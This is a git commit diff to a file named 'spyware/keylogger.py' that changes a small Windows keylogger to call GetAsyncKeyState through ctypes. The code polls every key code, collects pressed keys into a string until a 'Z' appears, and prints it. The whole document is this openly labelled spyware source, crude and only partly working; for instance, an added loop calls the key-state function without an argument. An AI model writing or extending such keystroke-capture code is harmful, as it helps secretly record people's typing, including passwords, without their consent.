94ca99a8c10aa000cab9424d82884acdf2ababe7
Diego Jonás Pérez <35743432+binarioGH@users.noreply.github.com>
2020-05-08 20:09:35 -0700

    AAAAAAAAAAAAAAAAAAAA

--- spyware/keylogger.py
+++ spyware/keylogger.py
@@ -1,14 +1,19 @@
 #-*-coding: utf-8-*-
-from win32api import GetAsyncKeyState as gas
+from ctypes import *
+from sys import stdout
 from time import sleep
+gas = cdll.user32.GetAsyncKeyState
 
 def main():
+	for i in range(0, 256):
+		i = gas()
 	text = ""
 	while "Z" not in text:
 		for i in range(0, 255):
 			if gas(i):
 				text += chr(i)
-			sleep(0.0000000000000000000001)
+			sleep(0.0000000000001)
+		stdout.flush()
 	print(text)
 
 if __name__ == '__main__':
